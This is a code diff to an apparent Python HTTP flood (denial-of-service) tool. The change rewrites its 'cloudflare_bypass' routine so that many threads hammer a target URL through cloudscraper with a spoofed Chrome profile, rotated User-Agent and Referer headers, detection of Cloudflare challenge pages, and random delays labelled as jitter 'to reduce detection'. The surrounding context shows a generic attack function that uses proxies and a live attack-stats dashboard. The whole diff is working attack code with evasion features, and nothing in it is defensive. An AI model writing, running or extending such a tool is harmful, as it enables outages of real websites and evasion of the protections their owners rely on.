@@ -7,6 +7,7 @@ import random
 import time
 import os
 import socket
+import cloudscraper
 import requests
 from rich.console import Console
 from rich.live import Live
@@ -179,12 +180,34 @@ async def generic_attack(url, duration, user_agents, proxies, method="GET", uri_
                     counters["error"] += 1
 
 # Cloudflare bypass
-def cloudflare_bypass(url, duration):
-    scraper = create_scraper()
+def cloudflare_bypass(url, duration, user_agents):
+    scraper = cloudscraper.create_scraper(
+        browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
+    )
+    
     end_time = time.time() + duration
+
     while time.time() < end_time:
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Referer": random.choice([
+                "https://google.com", "https://bing.com", "https://yahoo.com",
+                "https://facebook.com", "https://twitter.com", "https://instagram.com",
+                "https://pornhub.com", "https://tiktok.com", "https://reddit.com",
+                "https://github.com", "https://stackoverflow.com",
+
+            ]),
+            "Accept-Language": "en-US,en;q=0.9",
+            "Cache-Control": "no-cache"
+        }
+
         try:
-            scraper.get(url)
+            response = scraper.get(url, headers=headers, timeout=10)
+
+            # Cloudflare challenge detection (basic)
+            if "cf-chl-bypass" in response.text or "Attention Required" in response.text:
+                raise Exception("Cloudflare challenge page detected")
+
             with lock:
                 counters["total"] += 1
                 counters["success"] += 1
@@ -192,7 +215,11 @@ def cloudflare_bypass(url, duration):
             with lock:
                 counters["total"] += 1
                 counters["error"] += 1
+        
+        # Jitter to reduce detection
+        time.sleep(random.uniform(0.8, 2.5))
 
+# Stats Dashboard
 def stats_dashboard(url, duration):
     start = time.time()
     end_time = start + duration
@@ -368,7 +395,7 @@ async def main():
         threading.Thread(target=stats_dashboard, args=(url, duration), daemon=True).start()
 
         if info['cloudflare']:
-            threads_list = [threading.Thread(target=cloudflare_bypass, args=(url, duration), daemon=True) for _ in range(threads)]
+            threads_list = [threading.Thread(target=cloudflare_bypass, args=(url, duration, user_agents), daemon=True) for _ in range(threads)]
             for t in threads_list: t.start()
             for t in threads_list: t.join()
         else:
